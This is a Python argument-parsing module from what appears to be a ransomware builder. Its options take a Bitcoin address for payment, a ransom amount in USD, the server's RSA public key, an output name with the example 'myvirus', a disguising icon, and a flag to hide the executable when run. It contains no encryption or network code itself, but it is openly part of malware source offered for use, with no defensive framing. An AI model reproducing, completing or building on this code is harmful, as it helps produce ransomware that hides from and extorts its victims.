# Date: 08/24/2018
# Author: Pure-L0G1C
# Description: Arguments

from os import path
from argparse import ArgumentParser


class Args:

    def __init__(self):
        self.btc = None
        self.amount = None
        self.name = None
        self.type = None
        self.hide = None
        self.icon = None
        self.server_RSA_public_key = None

    def error(self, error):
        print('Error: {}'.format(error))

    def get_args(self):
        parser = ArgumentParser()

        parser.add_argument('-b',
                            '--btc',
                            required=True,
                            help='the btc address to send payment to.')

        parser.add_argument('-a',
                            '--amount',
                            required=True,
                            help='the amount of payment in USD. \
                            Example: -a 120')

        parser.add_argument('-k',
                            '--key',
                            required=True,
                            help='the path to the RSA public key of the server. Must run thor.py to generate keys \
                            Example: -k ../server/keys/public.pem')

        parser.add_argument('-n',
                            '--name',
                            required=True,
                            help='the name of the output file. \
                            Example: -n myvirus')

        parser.add_argument('-t',
                            '--type',
                            default='exe',
                            help='the output type.\
                            Example: -t python \
                            Example: -t exe')

        parser.add_argument('-ic',
                            '--icon',
                            default=None,
                            help='the output type.\
                            Example: -ic FILE.ico \
                            Example: -ic FILE.exe')

        parser.add_argument('-hd',
                            '--hide',
                            default=False,
                            action='store_true',
                            help='hide the executable when executed. \
                            Example: --hide')

        return parser.parse_args()

    def set_args(self):
        args = self.get_args()
        self.btc = args.btc
        self.amount = args.amount
        self.name = args.name
        self.type = args.type
        self.hide = args.hide
        self.icon = args.icon
        self.server_RSA_public_key = args.key

        if any([not self.valid_type, not self.valid_icon, not self.valid_key]):
            return False
        return True

    @property
    def valid_key(self):
        if not path.exists(self.server_RSA_public_key):
            self.error('Invalid path to server\'s public key')
            return False
        if not self.server_RSA_public_key.endswith('.pem'):
            self.error('Public key must end with .pem extension')
            return False
        return True

    @property
    def valid_type(self):
        if not any([self.type == 'exe', self.type == 'python']):
            self.error('Invalid type')
            return False
        self.type = True if self.type == 'exe' else False
        return True

    @property
    def valid_icon(self):
        if not self.icon:
            return True
        if not path.exists(self.icon):
            self.error(
                'Check your path to your icon, `{}` does not exist'.format(self.icon))
            return False
        else:
            if not any([self.icon.endswith('exe'), self.icon.endswith('ico')]):
                self.error('Icon file must be a .ico or .exe')
                return False
        return True
